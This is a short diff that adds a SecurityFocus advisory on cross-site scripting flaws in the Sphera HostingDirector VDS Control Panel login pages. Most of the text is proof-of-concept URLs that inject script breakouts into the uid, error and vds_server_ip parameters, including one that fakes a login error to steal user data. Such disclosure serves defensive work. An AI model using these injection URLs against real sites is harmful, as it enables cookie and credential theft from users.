@@ -1,0 +1,29 @@
+source: http://www.securityfocus.com/bid/7899/info
+
+Sphera HostingDirector VDS Control Panel has been reported prone to several cross-site scripting attacks. The vulnerabilities exist due to insufficient sanitization of user-supplied input for certain URI parameters.
+
+Successful exploitation could permit theft of cookie-based authentication credentials from legitimate users of the HostingDirector Control Panel. 
+
+http://[TARGET]/[INSTALLATION PATH]/login/sm_login_screen.php?uid=">[XSS
+ATTACK CODE]
+
+http://[TARGET]/[INSTALLATION PATH]/login/sm_login_screen.php?error=">[XSS
+ATTACK CODE]
+
+http://[TARGET]/[INSTALLATION PATH]/login/sm_login_screen.php?error=[XSS
+ATTACK CODE COMBINATED WITH OTHER VARIABLE FOR EMULATE A REAL ERROR LIKE
+"EITHER PASSWORD OR USER ARE INCORRECT , RE-FILL IN" FOR STEAL THE USER
+DATA]
+
+http://[TARGET]/[INSTALLATION PATH]/login/login_screen.php?vds_ip=[VDS
+DOMAIN OR IP]&uid=">[XSS ATTACK CODE]&tz=[TIMEZONE CODE , TRY
+CEST]&vds_server_ip=">[XSS ATTACK CODE]
+
+https://[TARGET]/[INSTALLATION PATH]/login/login_screen.php?vds_ip=[VDS
+DOMAIN OR
+IP]&uid="></form>here%20comes%20your%20attack<h1>&tz=CEST&vds_server_ip=">He
+re%20comes%20your%20XSS%20Attack&error=Either+user+or+password+are+incorrect
++,+please+re-fill+in+.
+
+https://[TARGET]/[INSTALLATION
+PATH]/login/sm_login_screen.php?uid="><h1>XSS%20! 
